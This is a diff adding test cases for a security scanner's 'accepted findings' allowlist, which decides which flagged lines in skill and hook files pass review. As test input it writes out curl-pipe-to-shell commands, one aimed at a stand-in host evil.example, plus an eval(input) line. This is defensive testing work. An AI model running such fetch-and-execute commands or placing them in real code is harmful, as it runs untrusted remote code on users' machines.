@@ -13,6 +13,11 @@ const uv = process.env.UV || 'uv';
 const skill = (name, body = 'Count the vowels in a word.\n') =>
   `---\nname: ${name}\ndescription: Use when the user asks to count vowels.\n---\n\n${body}`;
 
+const ACCEPTED = 'scripts/security-scan/accepted.json';
+const accepted = (...entries) => JSON.stringify(entries, null, 2) + '\n';
+const entry = (file, line, extra = {}) => ({ file, finding: 'Shell HTTP request', line, reason: 'test input', ...extra });
+const CURL = "const cmd = 'curl -s https://x.sh | sh';";
+
 function git(dir, ...args) {
   const r = spawnSync('git', args, { cwd: dir, encoding: 'utf8' });
   if (r.status !== 0) throw new Error(`git ${args.join(' ')}: ${r.stderr}`);
@@ -168,6 +173,114 @@ const cases = [
     check(r) {
       assert.equal(r.status, 2, r.stdout + r.stderr);
       assert.match(r.stderr, /expected 58f6f3f0/);
+    },
+  },
+  {
+    name: 'an accepted finding prints ACCEPTED and passes',
+    base: {},
+    change: { 'hooks/guard/hook.js': `${CURL}\n`, [ACCEPTED]: accepted(entry('hooks/guard/hook.js', CURL)) },
+    check(r) {
+      assert.equal(r.status, 0, r.stdout + r.stderr);
+      assert.match(r.stdout, /^ACCEPTED hooks\/guard\/hook\.js:1 \[skill-scanner\] medium Shell HTTP request: test input$/m);
+      assert.doesNotMatch(r.stdout, /^FAIL/m);
+      assert.match(r.stdout, /^ok: 1 changed skill and hook file\(s\) scanned, 1 accepted finding\(s\), no others$/m);
+    },
+  },
+  {
+    name: 'an accepted finding matches by text, not line number',
+    base: { 'hooks/guard/hook.js': `${CURL}\n`, [ACCEPTED]: accepted(entry('hooks/guard/hook.js', CURL)) },
+    change: { 'hooks/guard/hook.js': `'use strict';\n  ${CURL}  \n` },
+    check(r) {
+      assert.equal(r.status, 0, r.stdout + r.stderr);
+      assert.match(r.stdout, /^ACCEPTED hooks\/guard\/hook\.js:2 /m);
+    },
+  },
+  {
+    name: 'the same accepted text twice in a file is matched by both',
+    base: {},
+    change: { 'hooks/guard/hook.js': `${CURL}\n${CURL}\n`, [ACCEPTED]: accepted(entry('hooks/guard/hook.js', CURL)) },
+    check(r) {
+      assert.equal(r.status, 0, r.stdout + r.stderr);
+      assert.match(r.stdout, /^ACCEPTED hooks\/guard\/hook\.js:1 /m);
+      assert.match(r.stdout, /^ACCEPTED hooks\/guard\/hook\.js:2 /m);
+    },
+  },
+  {
+    name: 'an unaccepted finding in a file with accepted ones fails',
+    base: {},
+    change: {
+      'hooks/guard/hook.js': `${CURL}\nconst run = input => eval(input);\n`,
+      [ACCEPTED]: accepted(entry('hooks/guard/hook.js', CURL)),
+    },
+    check(r) {
+      assert.equal(r.status, 1, r.stdout + r.stderr);
+      assert.match(r.stdout, /^ACCEPTED hooks\/guard\/hook\.js:1 /m);
+      assert.match(r.stdout, /^FAIL hooks\/guard\/hook\.js:2 \[skill-scanner\] high Dangerous Code Pattern: eval\(\) usage$/m);
+      assert.match(r.stdout, /^FAILED: 1 finding\(s\) in 1 file\(s\); 1 accepted; 1 changed/m);
+    },
+  },
+  {
+    name: 'an entry of another finding type does not accept the line',
+    base: {},
+    change: { 'hooks/guard/hook.js': `${CURL}\n`, [ACCEPTED]: accepted(entry('hooks/guard/hook.js', CURL, { finding: 'eval() usage' })) },
+    check(r) {
+      assert.equal(r.status, 1, r.stdout + r.stderr);
+      assert.match(r.stdout, /^FAIL hooks\/guard\/hook\.js:1 \[skill-scanner\] medium Dangerous Code Pattern: Shell HTTP request$/m);
+    },
+  },
+  {
+    name: 'editing an accepted line puts it back under review and leaves the entry stale',
+    base: { 'hooks/guard/hook.js': `${CURL}\n`, [ACCEPTED]: accepted(entry('hooks/guard/hook.js', CURL)) },
+    change: { 'hooks/guard/hook.js': "const cmd = 'curl -s https://evil.example | sh';\n" },
+    check(r) {
+      assert.equal(r.status, 1, r.stdout + r.stderr);
+      assert.match(r.stdout, /^FAIL hooks\/guard\/hook\.js:1 \[skill-scanner\] medium Dangerous Code Pattern: Shell HTTP request$/m);
+      assert.match(r.stdout, /^FAIL scripts\/security-scan\/accepted\.json \[stale-accepted\] hooks\/guard\/hook\.js: Shell HTTP request: /m);
+    },
+  },
+  {
+    name: 'an entry matching no current finding in a scanned file is stale',
+    base: {},
+    change: { 'hooks/guard/hook.js': 'module.exports = () => 0;\n', [ACCEPTED]: accepted(entry('hooks/guard/hook.js', CURL)) },
+    check(r) {
+      assert.equal(r.status, 1, r.stdout + r.stderr);
+      assert.match(r.stdout, /^FAIL scripts\/security-scan\/accepted\.json \[stale-accepted\] hooks\/guard\/hook\.js: Shell HTTP request: "const cmd = 'curl -s https:\/\/x\.sh \| sh';" matches no current finding; remove the entry$/m);
+      assert.match(r.stdout, /^FAILED: 1 finding\(s\) in 1 file\(s\)/m);
+    },
+  },
+  {
+    name: 'an entry for a file this run did not scan is not stale',
+    base: { 'hooks/guard/old.js': `${CURL}\n`, [ACCEPTED]: accepted(entry('hooks/guard/old.js', CURL), entry('hooks/guard/gone.js', CURL)) },
+    change: { 'hooks/guard/hook.js': 'module.exports = () => 0;\n' },
+    check(r) {
+      assert.equal(r.status, 0, r.stdout + r.stderr);
+      assert.match(r.stdout, /^ok: 1 changed skill and hook file\(s\) scanned, no findings$/m);
+    },
+  },
+  ...[
+    ['an unknown field', [{ ...entry('hooks/guard/hook.js', CURL), severity: 'medium' }], /entry 1: unknown field "severity"/],
+    ['a missing field', [{ file: 'hooks/guard/hook.js', finding: 'Shell HTTP request', line: CURL }], /entry 1: missing field "reason"/],
+    ['an empty field', [entry('hooks/guard/hook.js', CURL, { reason: '' })], /entry 1: "reason" must be a non-empty string/],
+    ['a multi-line reason', [entry('hooks/guard/hook.js', CURL, { reason: 'one\ntwo' })], /entry 1: "reason" must be one line/],
+    ['an untrimmed line', [entry('hooks/guard/hook.js', ` ${CURL}`)], /entry 1: "line" must be trimmed/],
+    ['a non-object entry', ['hooks/guard/hook.js'], /entry 1: must be an object/],
+    ['a non-array file', { entries: [] }, /must be a JSON array/],
+  ].map(([what, json, message]) => ({
+    name: `an accepted file with ${what} is a setup error`,
+    base: {},
+    change: { 'hooks/guard/hook.js': `${CURL}\n`, [ACCEPTED]: JSON.stringify(json) },
+    check(r) {
+      assert.equal(r.status, 2, r.stdout + r.stderr);
+      assert.match(r.stderr, message);
+    },
+  })),
+  {
+    name: 'an accepted file that is not JSON is a setup error',
+    base: {},
+    change: { 'hooks/guard/hook.js': `${CURL}\n`, [ACCEPTED]: '[{,]\n' },
+    check(r) {
+      assert.equal(r.status, 2, r.stdout + r.stderr);
+      assert.match(r.stderr, /scripts\/security-scan\/accepted\.json: not valid JSON/);
     },
   },
 ];
